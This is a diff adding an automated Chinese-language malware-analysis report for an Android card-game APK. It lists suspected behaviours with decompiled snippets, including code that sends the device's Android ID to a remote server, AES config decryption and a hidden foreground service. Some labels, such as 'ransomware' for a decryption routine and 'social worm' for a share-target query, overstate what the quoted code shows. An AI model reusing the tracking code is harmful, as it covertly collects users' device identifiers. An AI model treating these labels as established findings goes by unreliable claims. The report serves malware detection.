@@ -1,0 +1,251 @@
+{
+  "APK信息": {
+    "文件名": "afead9da3740e9739764b5bf9336997d5e50ca87a3b1a541cd0684f6f5c42dae.apk",
+    "sha256": "afead9da3740e9739764b5bf9336997d5e50ca87a3b1a541cd0684f6f5c42dae",
+    "包名": "com.cardfreegame.sevensfreecardgame",
+    "应用名": "Sevens FREE Card Game",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 488.6
+  },
+  "行为列表": [
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getSubscriberId",
+          "ANDROID_ID",
+          "getMacAddress"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\c;",
+          "method_signature": "run()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "str2 = str + \"?v=1.0.3&p=\" + context.getPackageName() + \"&ai=\" + Settings.Secure.getString(context.getContentResolver(), \"android_id\") + \"&fv=1\";\nnew URL(str2).openStream()",
+          "malicious_code_snippet_context": "              public void run() {\n                  String str2 = str;\n                  try {\n>>>                     str2 = str + \"?v=1.0.3&p=\" + context.getPackageName() + \"&ai=\" + Settings.Secure.getString(context.getContentResolver(), \"android_id\") + \"&fv=1\";\n>>>                 } catch (Exception e) {\n                  }\n                  try {\n                      JSONObject jSONObject = new JSONObject(c.a(new Scanner(new URL(str2).openStream(), WebRequest.CHARSET_UTF_8).useDelimiter(\"\\\\A\").next(), new String(Base64.decode(\"N2pkN0hDbGFienpHcjk1cQ==\", 0))));",
+          "behavior_description": "代码在子线程中构建URL，拼接应用包名(getPackageName)和设备Android ID作为查询参数，通过URL.openStream()向远程服务器发起HTTP GET请求，将设备指纹信息外发至C2服务器。服务器返回JSON配置（含cheats等字段），使用Base64解码的密钥进行解密后存储，实现远程配置下发与设备追踪。数据流向：Settings.Secure.getString获取android_id → URL.openStream外发至远程服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\c;",
+          "method_signature": "a(String str, String str2)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SecretKeySpec secretKeySpec = new SecretKeySpec(str2.getBytes(), \"AES\");\nCipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\ncipher.init(2, secretKeySpec);\nbArr = cipher.doFinal(Base64.decode(str.getBytes(), 0));\nreturn new String(bArr);",
+          "malicious_code_snippet_context": "      public static String a(String str, String str2) {\n          byte[] bArr = null;\n          try {\n>>>             SecretKeySpec secretKeySpec = new SecretKeySpec(str2.getBytes(), \"AES\");\n>>>             Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n>>>             cipher.init(2, secretKeySpec);\n>>>             bArr = cipher.doFinal(Base64.decode(str.getBytes(), 0));\n>>>         } catch (Exception e) {\n              System.out.println(e.toString());\n          }\n          return new String(bArr);",
+          "behavior_description": "该类伪装为系统类 android.system.c，方法 a() 使用 AES/ECB/PKCS5Padding 解密数据。cipher.init(2, ...) 中模式 2 为 DECRYPT_MODE，表明该方法用于解密 Base64 编码的密文。在勒索软件上下文中，此解密例程很可能用于解密内置的加密配置（如 C2 地址、加密密钥或指令），为文件加密行为提供支撑。数据来源为方法参数 str（密文）和 str2（AES密钥），经 Base64 解码后流入 Cipher.doFinal() 进行 AES 解密，返回明文字符串。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground",
+              "WakeLock"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\sa\\SS;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 16)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "notification = new Notification.Builder(this).setContentTitle(\"\").setContentText(\"\").setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).build();\nstartForeground(VASTModel.ERROR_CODE_XML_VALIDATE, notification);",
+          "malicious_code_snippet_context": "              if (b != null) {\n                  b.a(\"icon != null\");\n                  if (Build.VERSION.SDK_INT >= 16) {\n>>>                     notification = new Notification.Builder(this).setContentTitle(\"\").setContentText(\"\").setLargeIcon(Bitmap.createScaledBitmap(b, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).build();\n>>>                 } else {\n                      notification = new Notification.Builder(this).setContentTitle(\"\").setContentText(\"\").setLargeIcon(Bitmap.createScaledBitmap(b, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).getNotification();\n                  }\n              } else {",
+          "behavior_description": "该代码通过创建一个标题和内容均为空字符串的持久化通知（setOngoing(true)使其不可滑动清除），并调用startForeground()将自身提升为前台服务，从而利用Android系统的前台服务保活机制防止进程被系统回收。通知使用系统图标btn_star_big_on伪装，空标题/内容降低用户察觉度。结合方法b()中对'drive'、'gmail'、'music'、'youtube'等Google应用名的判断，该恶意软件还会伪装成合法Google应用图标以进一步隐蔽自身。数据流向：Notification.Builder构造空通知(source)→startForeground()启动前台服务保活(sink)。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "root_exploitation",
+      "中文名": "Root提权",
+      "MITRE": "T1407",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "/system/bin/su",
+          "/system/xbin/su",
+          "/sbin/su",
+          "Superuser.apk"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\chartboost\\es\\sdk\\Libraries\\CBUtility;",
+          "method_signature": "i()",
+          "malicious_behavior": "root_exploitation",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private static boolean i() {\n    return new File(\"/system/app/Superuser.apk\").exists();\n}",
+          "malicious_code_snippet_context": "          return str != null && str.contains(\"test-keys\");\n      }\n  \n>>>     private static boolean i() {\n>>>         return new File(\"/system/app/Superuser.apk\").exists();\n>>>     }\n  \n      private static boolean j() {\n          for (String str : new String[]{\"/sbin/su\", \"/system/bin/su\", \"/system/xbin/su\", \"/data/local/xbin/su\", \"/data/local/bin/su\", \"/system/sd/xbin/su\", \"/system/bin/failsafe/su\", \"/data/local/su\"}) {",
+          "behavior_description": "该方法通过检查 /system/app/Superuser.apk 文件是否存在来判断设备是否已 root。结合同类中的 h() 检测 Build.TAGS 是否包含 test-keys、j() 遍历多个 su 二进制路径，构成完整的 root 环境探测链。在恶意样本中，此类检测通常用于决定是否执行后续提权利用或规避安全分析环境，属于 root 利用行为链的前置侦察步骤。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "anti_root",
+          "中文名": "反Root",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "/system/bin/su",
+              "Superuser.apk"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\chartboost\\es\\sdk\\Libraries\\CBUtility;",
+          "method_signature": "i()",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "private static boolean i() {\n    return new File(\"/system/app/Superuser.apk\").exists();\n}",
+          "malicious_code_snippet_context": "          return str != null && str.contains(\"test-keys\");\n      }\n  \n>>>     private static boolean i() {\n>>>         return new File(\"/system/app/Superuser.apk\").exists();\n>>>     }\n  \n      private static boolean j() {\n          for (String str : new String[]{\"/sbin/su\", \"/system/bin/su\", \"/system/xbin/su\", \"/data/local/xbin/su\", \"/data/local/bin/su\", \"/system/sd/xbin/su\", \"/system/bin/failsafe/su\", \"/data/local/su\"}) {",
+          "behavior_description": "该方法通过检查系统目录下是否存在 Superuser.apk 文件来判断设备是否已被 Root。数据来源为文件系统路径 /system/app/Superuser.apk，通过 File.exists() 探测该路径是否存在，返回布尔值供调用方进行条件判断。结合同类方法 h() 检查 Build.TAGS 是否包含 test-keys、方法 j() 遍历多个 su 二进制路径，构成完整的 Root 检测套件。恶意软件利用此检测结果可决定是否执行敏感行为或逃避安全分析。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "social_spread",
+      "中文名": "社交蠕虫传播",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "android.intent.action.SEND"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\a\\a\\f;",
+          "method_signature": "b(String str)",
+          "malicious_behavior": "social_spread",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.SEND\");\nintent.setType(WebRequest.CONTENT_TYPE_PLAIN_TEXT);\nIterator<ResolveInfo> it = ag.queryIntentActivities(intent, 0).iterator();\nwhile (it.hasNext()) {\n    if (it.next().activityInfo.packageName.startsWith(str)) {\n        return true;\n    }\n}\nreturn false;",
+          "malicious_code_snippet_context": "      }\n  \n      protected boolean b(String str) {\n>>>         Intent intent = new Intent(\"android.intent.action.SEND\");\n>>>         intent.setType(WebRequest.CONTENT_TYPE_PLAIN_TEXT);\n>>>         Iterator<ResolveInfo> it = ag.queryIntentActivities(intent, 0).iterator();\n>>>         while (it.hasNext()) {\n>>>             if (it.next().activityInfo.packageName.startsWith(str)) {\n>>>                 return true;\n>>>             }\n>>>         }\n>>>         return false;\n      }\n  \n      protected boolean a(String str, String str2) {",
+          "behavior_description": "该代码通过构造ACTION_SEND的Intent并查询所有能处理纯文本分享的Activity（如微信、QQ、短信等社交/通讯应用），逐一检查是否有包名以指定前缀开头的应用已安装。这是社交蠕虫传播的前置探测行为：先枚举设备上可用的社交传播渠道，再决定通过哪个平台向联系人发送恶意链接或消息进行自我传播。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\ap\\ActionActivity;",
+          "method_signature": "b(String str)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory() + \"/download/\" + g.a(str) + \".apk\")), \"application/vnd.android.package-archive\");\nintent.setFlags(268435456);\nstartActivity(intent);",
+          "malicious_code_snippet_context": "  \n      private void b(String str) {\n          try {\n>>>             Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>             intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory() + \"/download/\" + g.a(str) + \".apk\")), \"application/vnd.android.package-archive\");\n>>>             intent.setFlags(268435456);\n>>>             startActivity(intent);\n          } catch (Exception e) {\n              f.a(e.toString());\n          }",
+          "behavior_description": "代码通过传入的字符串参数构造本地下载目录下的APK文件路径，并使用带有FLAG_ACTIVITY_NEW_TASK的Intent (android.intent.action.VIEW) 调起系统包安装器来安装该APK文件。数据来源为方法参数str，危险操作为startActivity触发APK安装。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
